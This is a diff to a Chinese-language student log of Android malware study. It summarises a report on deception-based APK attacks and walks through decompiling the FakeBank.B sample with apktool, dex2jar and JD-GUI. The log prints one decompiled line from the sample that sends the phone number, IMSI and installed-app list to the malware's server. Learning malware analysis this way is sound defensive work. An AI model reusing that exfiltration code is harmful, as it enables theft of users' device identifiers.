@@ -158,4 +158,25 @@ https://github.com/parkmftsai/android-malware
 其中BreakBottleneck這個資料夾有一個Break Bottleneck.pdf可以看
 內容大概在敘述BreakBottleneck內的所有apk攻擊方式，大致上都是以欺騙為主的攻擊，講述的還算完整
 ，也給了我一些不錯的思考方向，不過，我尚未看完＝＝
+yed:把他看完，然後選一個apk做逆向工程
+```
+```
+20180510
+終於把Break Bottleneck.pdf看完了，
+結論：
+根據百度的調查，那些有彩蛋的malware apk很多時候都是第三方apk（想成沒放在play商店的apk），
+而且透過藍芽或是femticell傳送的惡意程式，有越來越多的趨勢。
+所以我們可以簡短的說,Break Bottleneck.pdf裡頭記載的攻擊，很多時候都是使用者沒有良好的資安思維造成的，
+在智慧型手機興起的年代，如何向下紮根資訊安全教育，絕對會是21世紀最重要的問題。
+
+再來，做個逆向工程，我選擇FakeBank.B這個apk測試，還是選用apktool來玩，
+但是，我不太會看smali檔＝＝
+於是乎，我找了一些方式，看看有沒有好用的工具可以協助我，還真的有喔
+我使用dex2jar＋JD-GUI
+dex2jar可以將apk裡頭的class.dex檔，轉成jar檔
+然後透過JD-GUI將此jar檔打開，就可以讀java檔囉
+最後在讀java code的過程中
+ String str = Config.get(CoreService.mContext, run("U=Tko6Xm/dU3RgE3llt5Mz+f"), Config.SERVER_HOST) + Config.SERVER_ADDRESS + run("Q=AHRwcbACkJFQUJQTABjWd2TzKg") + Config.getPhoneNumber(App.this.mContext).trim() + run("==MwbWJiQ0EBktx0MwZz") + Config.getIMSI(App.this.mContext).trim() + run("==QvbWInLAdhQ0QBKIokMwei") + URLEncoder.encode(App.this.getApps().trim());
+感覺這段有問題阿XD
+
 ```
